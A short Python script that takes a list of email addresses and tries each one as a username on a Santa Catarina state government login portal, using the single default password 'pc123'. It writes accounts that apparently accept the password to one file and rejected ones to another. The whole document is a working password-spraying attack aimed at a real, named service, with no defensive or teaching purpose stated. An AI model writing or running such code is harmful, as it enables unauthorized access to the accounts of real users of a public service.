from bs4 import BeautifulSoup
import urllib.request


fileObj = open("email_list.txt", "r") 
emails = fileObj.read().splitlines() 
fileObj.close()
for email in emails:
    
    login = "https://pae.sc.gov.br/direto/Direto/Autoriza?direto_tarefa=autorizaUsuario&direto_user="+email+"&direto_senha=pc123&language=pt_BR&grava_cookie=TRUE&editHTML=true&userResolucao=1920x1080&userBrowserName=mozilla&userBrowserVersion=93.0&userSO=windows"

    page = urllib.request.urlopen(login)

    soup = BeautifulSoup(page, 'html.parser')

    list_item = soup.find("body")

    if list_item == None:
        with open("PC123.txt", "a") as a_file:
            a_file.write(email)
            a_file.write("\n")

    elif list_item["class"] == ["loginContentBody"]:
        with open("Senha_Diferente.txt", "a") as a_file:
            a_file.write(email)
            a_file.write("\n")
